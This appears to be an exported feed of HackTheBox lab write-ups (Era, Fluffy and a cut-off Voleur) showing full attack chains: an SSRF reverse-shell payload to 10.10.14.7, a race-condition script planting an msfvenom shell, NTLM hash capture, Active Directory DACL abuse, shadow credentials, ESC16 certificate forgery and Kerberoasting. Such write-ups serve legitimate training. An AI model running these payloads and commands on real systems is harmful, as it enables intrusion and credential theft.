/download.php?id=150&amp;show=true&amp;format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.14.7/9001+0&gt;%261;&#x27;

The URI starts with ssh2.exec, using the ssh library. Then we have â€œ:&#x2F;&#x2F;yuri:&#x6d;&#117;&#x73;&#116;&#x61;&#110;&#103;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;:22â€œ this part is the connection via localhost on port 22(ssh). Then we add our command we want to run, this being the â€œ&#x2F;bash+-c+â€™bash+-i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;9001+0&gt;%261;â€™â€œ. Once ran we get a hang and a call back.

Yuri-ka!!!! We did it!!!We can start by looking at users on the box.
yuri@era:~$ cat /etc/passwd | grep sh$cat /etc/passwd | grep sh$root:x:0:0:root:/root:/bin/basheric:x:1000:1000:eric:/home/eric:/bin/bashyuri:x:1001:1002::/home/yuri:/bin/sh

We have eric, we can try to escalate to him with his password. 
yuri@era:~$ su ericsu ericPassword: americapython3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;eric@era:/home/yuri$

So Eric, now what??After switching to eric, we looked at typical empty dirs to find one not so empty. 
eric@era:/home/yuri$ cd /optcd /opteric@era:/opt$ ls -lsals -lsatotal 124 drwxrwxr-x  3 root root 4096 Jul 22 08:42 .4 drwxr-xr-x 20 root root 4096 Jul 22 08:41 ..4 drwxrwxr--  3 root devs 4096 Jul 22 08:42 AV

This seems to be a AV binary of some sort, thereâ€™s a monitor ELF file we donâ€™t have access to run, yet we are in the group who can modify it. 
eric@era:/opt/AV/periodic-checks$ ls -lsals -lsatotal 32 4 drwxrwxr-- 2 root devs  4096 Jul 28 19:55 . 4 drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..20 -rwxrw---- 1 root devs 16544 Jul 28 19:55 monitor 4 -rw-rw---- 1 root devs   205 Jul 28 19:55 status.logeric@era:/opt/AV/periodic-checks$ ididuid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
PrivEscI wanted to look at other process running and maybe crons. I copied over pspy64 to see any processes running in the background we might have missed.
2025/07/28 20:01:04 CMD: UID=0     PID=5038   | rm -f text_sig_section.bin2025/07/28 20:02:01 CMD: UID=0     PID=5045   | /usr/sbin/CRON -f -P2025/07/28 20:02:01 CMD: UID=0     PID=5046   |2025/07/28 20:02:01 CMD: UID=0     PID=5047   |2025/07/28 20:02:01 CMD: UID=0     PID=5048   | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor2025/07/28 20:02:01 CMD: UID=0     PID=5049   | /bin/bash /root/initiate_monitoring.sh2025/07/28 20:02:01 CMD: UID=0     PID=5050   | /bin/bash /root/initiate_monitoring.sh2025/07/28 20:02:01 CMD: UID=0     PID=5051   | /bin/bash /root/initiate_monitoring.sh2025/07/28 20:02:01 CMD: UID=0     PID=5052   | /bin/bash /root/initiate_monitoring.sh2025/07/28 20:02:01 CMD: UID=0     PID=5053   |2025/07/28 20:02:01 CMD: UID=0     PID=5054   | /bin/bash /root/initiate_monitoring.sh2025/07/28 20:02:01 CMD: UID=0     PID=5055   | ???2025/07/28 20:02:01 CMD: UID=0     PID=5057   | /opt/AV/periodic-checks/monitor
Ok, so we see that it runs objcopy to check monitor. When I was reseaching I came across a article talking about a race condition we could try to abuse. I came up with a very small script the will take my reverse shell binary I cooked up with msfvenom and the copy of monitor I made and continuously replace each other, hoping this will be enough to beat the race condition.
#!/bin/bashTARGET_FILE=&quot;/opt/AV/periodic-checks/monitor&quot;LEGIT_FILE=&quot;/tmp/monitor&quot;MAL_FILE=&quot;/tmp/lame&quot;while true; do    cp &quot;$MAL_FILE&quot; &quot;$TARGET_FILE&quot; 2&gt;/dev/null    cp &quot;$LEGIT_FILE&quot; &quot;$TARGET_FILE&quot; 2&gt;/dev/nulldone
After getting a listener ready, we get a copy of monitor to /tmp and our malicous ELF binary over to the machine. 
eric@era:/tmp$ cp /opt/AV/periodic-checks/monitor .eric@era:/tmp$ wget 10.10.14.7/lame--2025-07-28 20:40:02--  http://10.10.14.7/lameConnecting to 10.10.14.7:80... connected.HTTP request sent, awaiting response... 200 OKLength: 194 [application/octet-stream]Saving to: â€˜lameâ€™lame                100%[===================&gt;]     194  --.-KB/s    in 0.003s2025-07-28 20:40:02 (73.4 KB/s) - â€˜lameâ€™ saved [194/194]eric@era:/tmp$ wget 10.10.14.7/privCheck.sh--2025-07-28 20:40:20--  http://10.10.14.7/privCheck.shConnecting to 10.10.14.7:80... connected.HTTP request sent, awaiting response... 200 OKLength: 222 [text/x-sh]Saving to: â€˜privCheck.shâ€™privCheck.sh        100%[===================&gt;]     222  --.-KB/s    in 0s2025-07-28 20:40:20 (24.4 MB/s) - â€˜privCheck.shâ€™ saved [222/222]eric@era:/tmp$
REVERSE SHELLmsfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f elf &gt; lame
After waiting a minute or twoâ€¦.or five ðŸ˜‘, we finally get a callback.
konoha# rlwrap -cAr nc -lvnp 9001listening on [any] 9001 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.79] 52422iduid=0(root) gid=0(root) groups=0(root)


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>TOCTOU</tag>
      </tags>
  </entry>
  <entry>
    <title>Fluffy (Windows Easy)</title>
    <url>/2025/05/26/Fluffy/</url>
    <content><![CDATA[
Starts with CVE-2025-24996, which is used to retrieve the hash of p.agila. This user Owns the Service Accounts OU, and can add themselves. Once done they have GenericWrite, and GenericAll which we can utilize for Shadow Credentials and obtain the hash for winrm_svc and other corresponding service accounts (ldap_svc, ca_svc). Having the ca_svc who is in Cert Publishers, we find a vulnerable template within ADCS. ESC 16 allows a low-privileged user to escalate their privilege. In doing so, we update the ca_svc account upn to administrator then request a pfx. This give us the administrator.pfx. Now we change back the upn for ca_svc and we authenticate with the administrator.pfx giving us the administrator hash.
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: rr.j.fleischman &#x2F; J0elTHEM4n1990!
Initial NmapPORT     STATE SERVICE          REASON53/tcp   open  domain           syn-ack88/tcp   open  kerberos-sec     syn-ack139/tcp  open  netbios-ssn      syn-ack389/tcp  open  ldap             syn-ack445/tcp  open  microsoft-ds     syn-ack464/tcp  open  kpasswd5         syn-ack593/tcp  open  http-rpc-epmap   syn-ack636/tcp  open  ldapssl          syn-ack3268/tcp open  globalcatLDAP    syn-ack3269/tcp open  globalcatLDAPssl syn-ack5985/tcp open  wsman            syn-ack
Common ports for an Active Directory Server.
SMBStarting here we can see we have read&#x2F;write to IT. We can check that out and see what it holds.
konoha# impacket-smbclient &#x27;fluffy.htb/j.fleischman:J0elTHEM4n1990!@fluffy.htb&#x27;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companiesType help for list of commands# sharesADMIN$C$IPC$ITNETLOGONSYSVOL# use IT# lsdrw-rw-rw-          0  Tue Aug 19 01:51:25 2025 .drw-rw-rw-          0  Tue Aug 19 01:51:25 2025 ..drw-rw-rw-          0  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64-rw-rw-rw-    1827464  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64.zipdrw-rw-rw-          0  Fri May 16 09:51:49 2025 KeePass-2.58-rw-rw-rw-    3225346  Fri May 16 09:51:49 2025 KeePass-2.58.zip-rw-rw-rw-     169963  Sat May 17 09:31:07 2025 Upgrade_Notice.pdf
I donâ€™t see any sort of database(db) file, we can look at the Upgrade_Notice.pdf and this shows us some critical vulnerabilities this server is susceptible to.
Researching CVE-2025-24071 led us looking on github and finding a CVE we can use. We simply create a file and upload, which in turn gets us the hash for p.agila.
konoha# impacket-smbclient &#x27;fluffy.htb/j.fleischman:J0elTHEM4n1990!@fluffy.htb&#x27;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companiesType help for list of commands# use ITl# lsdrw-rw-rw-          0  Tue Aug 19 02:01:51 2025 .drw-rw-rw-          0  Tue Aug 19 02:01:51 2025 ..drw-rw-rw-          0  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64-rw-rw-rw-    1827464  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64.zipdrw-rw-rw-          0  Fri May 16 09:51:49 2025 KeePass-2.58-rw-rw-rw-    3225346  Fri May 16 09:51:49 2025 KeePass-2.58.zip-rw-rw-rw-     169963  Sat May 17 09:31:07 2025 Upgrade_Notice.pdf# put exploit.zip# cd Everything-1.4.1.1026.x64# put exploit.zip# cd ..# cd KeePass-2.58# put exploit.zip#
Then listen.
konoha# responder -I tun0                                         __  .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|           NBT-NS, LLMNR &amp; MDNS Responder 3.1.6.0&lt;SNIP&gt;[+] Listening for events...[SMB] NTLMv2-SSP Client   : 10.10.11.69[SMB] NTLMv2-SSP Username : FLUFFY\p.agila[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:a74aa9fa1b5735bd:&lt;SNIP&gt;
And once cracked we can see permissions this user has.
BloodHound&#x2F;BloodyADOur user, p.agila owns Service Accounts, and can edit the DACL. We can give p.agila FullControl over the DACL.

With BloodyAD
konoha# bloodyAD -v DEBUG -d fluffy.htb -u p.agila -p &lt;SNIP&gt; --dc-ip 10.10.11.69 --host fluffy.htb add genericAll &#x27;Service Accounts&#x27; &#x27;p.agila&#x27;[+] Connection URL: ldap+ntlm-pw://fluffy.htb\p.agila:&lt;SNIP&gt;@fluffy.htb/?serverip=10.10.11.69[*] Trying to connect to fluffy.htb...[+] Connection successful[*] Old Security Descriptor: D:AI(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;S-1-5-11)(A;;0xf01ff;;;S-1-5-21-497550768-2797716248-2627064577-512)(A;CI;0xf01ff;;;S-1-5-21-497550768-2797716248-2627064577-1604)(A;;0xf01ff;;;S-1-5-32-548)(A;;0x20094;;;S-1-5-10)(A;;0x20094;;;S-1-5-11)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-497550768-2797716248-2627064577-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-497550768-2797716248-2627064577-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-497550768-2797716248-2627064577-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)[+] p.agila has now GenericAll on Service Accounts
Then we can add ourselves to the group:
konoha# bloodyAD -d fluffy.htb -u p.agila  -p &lt;SNIP&gt; --host fluffy.htb add groupMember &#x27;Service Accounts&#x27; &#x27;p.agila&#x27;[+] p.agila added to Service Accounts
In the ShadowsIf we look at what permissions Service Accounts has we can see some interesting users.
Since we have GenericWrite, we can just add shadow credentials for winrm_svc and the others.
konoha# certipy shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;&lt;SNIP&gt;&#x27; -account winrm_svc -dc-ip 10.10.11.69Certipy v5.0.2 - by Oliver Lyak (ly4k)[*] Targeting user &#x27;winrm_svc&#x27;[*] Generating certificate[*] Certificate generated[*] Generating Key Credential[*] Key Credential generated with DeviceID &#x27;cb5debf6-c514-d129-7371-3f40a64fc9d8&#x27;[*] Adding Key Credential with device ID &#x27;cb5debf6-c514-d129-7371-3f40a64fc9d8&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;[*] Successfully added Key Credential with device ID &#x27;cb5debf6-c514-d129-7371-3f40a64fc9d8&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;[*] Authenticating as &#x27;winrm_svc&#x27; with the certificate[*] Certificate identities:[*]     No identities found in this certificate[*] Using principal: &#x27;winrm_svc@fluffy.htb&#x27;[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to &#x27;winrm_svc.ccache&#x27;[*] Wrote credential cache to &#x27;winrm_svc.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;winrm_svc&#x27;[*] Restoring the old Key Credentials for &#x27;winrm_svc&#x27;[*] Successfully restored the old Key Credentials for &#x27;winrm_svc&#x27;[*] NT hash for &#x27;winrm_svc&#x27;: &lt;SNIP&gt;
Then for ca_svc:
konoha# certipy shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;&lt;SNIP&gt;&#x27; -account ca_svc -dc-ip 10.10.11.69Certipy v5.0.2 - by Oliver Lyak (ly4k)[*] Targeting user &#x27;ca_svc&#x27;[*] Generating certificate[*] Certificate generated[*] Generating Key Credential[*] Key Credential generated with DeviceID &#x27;a579746f-641a-f46c-6b2f-3c1872d0d203&#x27;[*] Adding Key Credential with device ID &#x27;a579746f-641a-f46c-6b2f-3c1872d0d203&#x27; to the Key Credentials for &#x27;ca_svc&#x27;[*] Successfully added Key Credential with device ID &#x27;a579746f-641a-f46c-6b2f-3c1872d0d203&#x27; to the Key Credentials for &#x27;ca_svc&#x27;[*] Authenticating as &#x27;ca_svc&#x27; with the certificate[*] Certificate identities:[*]     No identities found in this certificate[*] Using principal: &#x27;ca_svc@fluffy.htb&#x27;[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to &#x27;ca_svc.ccache&#x27;[*] Wrote credential cache to &#x27;ca_svc.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;ca_svc&#x27;[*] Restoring the old Key Credentials for &#x27;ca_svc&#x27;[*] Successfully restored the old Key Credentials for &#x27;ca_svc&#x27;[*] NT hash for &#x27;ca_svc&#x27;: &lt;SNIP&gt;

This keeps ESC-aping my mind (ESC16)We definitely look at ADCS since its present on the box, running a little check reveals a big mistake in configuration. We find ESC16 available for attack.
konoha# certipy -debug find -vulnerable -dc-ip 10.10.11.69 -u &#x27;ca_svc@fluffy.htb&#x27; -hashes :&lt;SNIP&gt; -stdout&lt;SNIP&gt;    Permissions      Owner                             : FLUFFY.HTB\Administrators      Access Rights        ManageCa                        : FLUFFY.HTB\Domain Admins                                          FLUFFY.HTB\Enterprise Admins                                          FLUFFY.HTB\Administrators        ManageCertificates              : FLUFFY.HTB\Domain Admins                                          FLUFFY.HTB\Enterprise Admins                                          FLUFFY.HTB\Administrators        Enroll                          : FLUFFY.HTB\Cert Publishers    [!] Vulnerabilities      ESC16                             : Security Extension is disabled.    [*] Remarks      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.Certificate Templates                   : [!] Could not find any certificate templates
Knipping at the heelsWe can technically get on the box, but lets see if we can just escalate ourselves first. First we update the upn of useraccount ca_svc to administrator.
konoha# certipy account -dc-ip 10.10.11.69 -u &#x27;ca_svc@fluffy.htb&#x27; -hashes &lt;SNIP&gt; -target fluffy.htb -upn administrator@fluffy.htb -user ca_svc updateCertipy v5.0.2 - by Oliver Lyak (ly4k)[*] Updating user &#x27;ca_svc&#x27;:    userPrincipalName                   : administrator@fluffy.htb[*] Successfully updated &#x27;ca_svc&#x27;
Then request a pfx using the User template.
konoha# certipy req -username ca_svc@fluffy.htb -hashes &lt;SNIP&gt; -dc-ip 10.10.11.69 -ca fluffy-DC01-CA -target DC01.fluffy.htb -template UserCertipy v5.0.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Request ID is 20[*] Successfully requested certificate[*] Got certificate with UPN &#x27;administrator@fluffy.htb&#x27;[*] Certificate has no object SID[*] Try using -sid to set the object SID or see the wiki for more details[*] Saving certificate and private key to &#x27;administrator.pfx&#x27;[*] Wrote certificate and private key to &#x27;administrator.pfx&#x27;
Then simply change the upn back for ca_svc.
konoha# certipy account -dc-ip 10.10.11.69 -u &#x27;ca_svc@fluffy.htb&#x27; -hashes &lt;SNIP&gt; -target fluffy.htb -upn ca_svc@fluffy.htb -user ca_svc updateCertipy v5.0.2 - by Oliver Lyak (ly4k)[*] Updating user &#x27;ca_svc&#x27;:    userPrincipalName                   : ca_svc@fluffy.htb[*] Successfully updated &#x27;ca_svc&#x27;
Finally, we can auth with this pfx and retrieve the administrator hash.
konoha# certipy auth -pfx administrator.pfx -domain fluffy.htb -username administrator -dc-ip 10.10.11.69Certipy v5.0.2 - by Oliver Lyak (ly4k)[*] Certificate identities:[*]     SAN UPN: &#x27;administrator@fluffy.htb&#x27;[*] Using principal: &#x27;administrator@fluffy.htb&#x27;[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to &#x27;administrator.ccache&#x27;[*] Wrote credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@fluffy.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>ADCS</tag>
        <tag>GenericWrite</tag>
        <tag>GenericAll</tag>
        <tag>ESC16</tag>
      </tags>
  </entry>
  <entry>
    <title>Voleur (Windows Medium)</title>
    <url>/2025/06/30/Voleur/</url>
    <content><![CDATA[
Voleur starts with credentials, but after a nmap you find NTLM is disabled. Using kerberos, we are able to get a bloodhound dump. Checking the shares reveals a xlsx file, we can convert it and crack it. Once done, we get access to a excel file with some users and passwords, one user has be deleted. Once on the box, we lateral move to ldap_svc, and find a user that has been deleted. Using powershell, we restore them and then get a shell using the password found from the xlsx file. Then we do to the next directory in the IT share, and find a archived users directory which hold DPAPI credentials. After obtaining the credentials, we find our user able to access a backup in the next directory that contains the SAM, SECURITY, and NTDS files used to dump the Administrator hash.
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor &#x2F; HollowOct31Nyt
Initial NmapPORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-19 09:21:15Z)135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack ttl 127464/tcp  open  kpasswd5?     syn-ack ttl 127593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped    syn-ack ttl 1272222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ack ttl 1275985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernelHost script results:| p2p-conficker:|   Checking for Conficker.C or higher...|   Check 1 (port 48495/tcp): CLEAN (Timeout)|   Check 2 (port 27736/tcp): CLEAN (Timeout)|   Check 3 (port 60782/udp): CLEAN (Timeout)|   Check 4 (port 36910/udp): CLEAN (Timeout)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required| smb2-time:|   date: 2025-08-19T09:21:18|_  start_date: N/A|_clock-skew: 59m59s
Since this is a windows environment, we can start with the simple AD enumeration.
LDAPWith credentials, we can get a dump for bloodhound.
konoha# bloodhound-python -d voleur.htb -u &#x27;ryan.naylor&#x27; -p &#x27;HollowOct31Nyt&#x27; -ns 10.10.11.76 --zip -c Group,LocalAdmin,Session,Trusts,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL --disable-autogc --dns-timeout 20 -dc DC.voleur.htb -k -no-pass
Checking the user descriptions for any juice details.
konoha# nxc ldap DC.voleur.htb -u ryan.naylor -p &#x27;HollowOct31Nyt&#x27; -k --use-kcache -M get-desc-usersLDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor from ccacheGET-DESC... DC.voleur.htb   389    DC               [+] Found following users:GET-DESC... DC.voleur.htb   389    DC               User: Administrator description: Built-in account for administering the computer/domainGET-DESC... DC.voleur.htb   389    DC               User: Guest description: Built-in account for guest access to the computer/domainGET-DESC... DC.voleur.htb   389    DC               User: krbtgt description: Key Distribution Center Service AccountGET-DESC... DC.voleur.htb   389    DC               User: ryan.naylor description: First-Line Support TechnicianGET-DESC... DC.voleur.htb   389    DC               User: marie.bryant description: First-Line Support TechnicianGET-DESC... DC.voleur.htb   389    DC               User: lacey.miller description: Second-Line Support TechnicianGET-DESC... DC.voleur.htb   389    DC               User: jeremy.combs description: Third-Line Support Technician
Well we have some groups, we can take a note of these and come back later.

Restore_Users
First-Line Support Technicians
FIrst-Line Technicians

SMBLetâ€™s check out what shares we have available to us.
konoha# nxc smb DC.voleur.htb -u ryan.naylor -p &#x27;HollowOct31Nyt&#x27; -k --sharesSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)SMB         DC.voleur.htb   445    DC               [+] VOLEUR.HTB\ryan.naylor from ccacheSMB         DC.voleur.htb   445    DC               [*] Enumerated sharesSMB         DC.voleur.htb   445    DC               Share           Permissions     RemarkSMB         DC.voleur.htb   445    DC               -----           -----------     ------SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote AdminSMB         DC.voleur.htb   445    DC               C$                              Default shareSMB         DC.voleur.htb   445    DC               FinanceSMB         DC.voleur.htb   445    DC               HRSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPCSMB         DC.voleur.htb   445    DC               IT              READSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server shareSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share
Connecting via SMB.
konoha# impacket-smbclient &#x27;voleur.htb/ryan.naylor@DC.voleur.htb&#x27; -k -no-pass -dc-ip 10.10.11.76&lt;SNIP&gt;# lsdrw-rw-rw-          0  Wed Jan 29 03:40:17 2025 .drw-rw-rw-          0  Wed Jan 29 03:10:01 2025 ..-rw-rw-rw-      16896  Thu May 29 17:23:36 2025 Access_Review.xlsx# mget *
From the IT share got Access_Review.xlsx, we can convert it to a hash and try to crack.
konoha# office2john Access_Review.xlsx &gt; access.hashkonoha# john --wordlist=/usr/share/wordlists/rockyou.txt access.hashUsing default input encoding: UTF-8Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])Cost 1 (MS Office version) is 2013 for all loaded hashesCost 2 (iteration count) is 100000 for all loaded hashesWill run 8 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status&lt;SNIP&gt;        (Access_Review.xlsx)

After cracking and opening. We have passwords and a user that was deleted(Possibly can restore him).
Looking at svc_ldap they has permission WriteSPN over svc_winrm. After setting with bloodyAD we can GetUserSPNs again for svc_winrmâ€™s hash.
konoha# bloodyAD -v DEBUG -d voleur.htb -u svc_ldap  -k --dc-ip 10.10.11.76 --host DC.voleur.htb set object svc_winrm servicePrincipalName -v HOST/svc_winrmkonoha# impacket-GetUserSPNs -dc-ip 10.10.11.76 &#x27;voleur.htb/svc_ldap&#x27; -request-user svc_winrm -k -no-pass -outputfile svc_winrm

svc_winrm password cracks and we get a TGT and WinRM on the box.
On BoxAs svc_winrm, we need to use RunaCs.exe to give ourself a shell as svc_ldap. 
*Evil-WinRM* PS C:\programdata&gt; .\RCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.2:443 -t 0[*] Warning: The logon for user &#x27;svc_ldap&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.[+] Running in session 0 with process function CreateProcessWithLogonW()[+] Using Station\Desktop: Service-0x0-2d33258$\Default[+] Async process &#x27;C:\ProgramData\ms.exe&#x27; with pid 2796 created in background.

As svc_ldap, we need find DeletedObjects using powershell.
PS C:\Windows\system32&gt; Get-ADObject -Filter &#x27;isDeleted -eq $true -and objectClass -eq &quot;user&quot;&#x27; -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-ListName            : Todd Wolfe                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169dbObjectGUID      : 1c6b1deb-c372-4cbb-87b1-15031de169dbobjectSid       : S-1-5-21-3927696377-1337352550-2781715495-1110lastKnownParent : OU=Second-Line Support Technicians,DC=voleur,DC=htb

Then restore this object(user).
